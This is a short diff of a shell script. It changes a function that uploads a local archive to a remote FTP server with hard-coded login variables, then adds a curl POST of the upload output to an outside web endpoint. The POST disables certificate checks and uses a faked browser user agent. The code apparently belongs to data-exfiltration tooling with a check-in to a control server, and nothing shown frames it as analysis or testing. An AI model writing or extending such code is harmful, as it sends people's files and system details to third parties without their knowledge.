@@ -71,13 +71,16 @@ function GCx_(){
 	local_file="$IBUS_""gcx.tar.gz"
 	remote_directory="/home/r00t1970/GCx.tar.gz"
 	#
-	ftp -npvi $ftp_server <<END_SCRIPT
+	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
 	quote USER $ftp_user
 	quote PASS $ftp_password
 	binary
 	put "$local_file" "$remote_directory"
 	quit
-	END_SCRIPT
+	END_SCRIPT`
+	#
+	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
+     dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
 }
 
 function ax(){
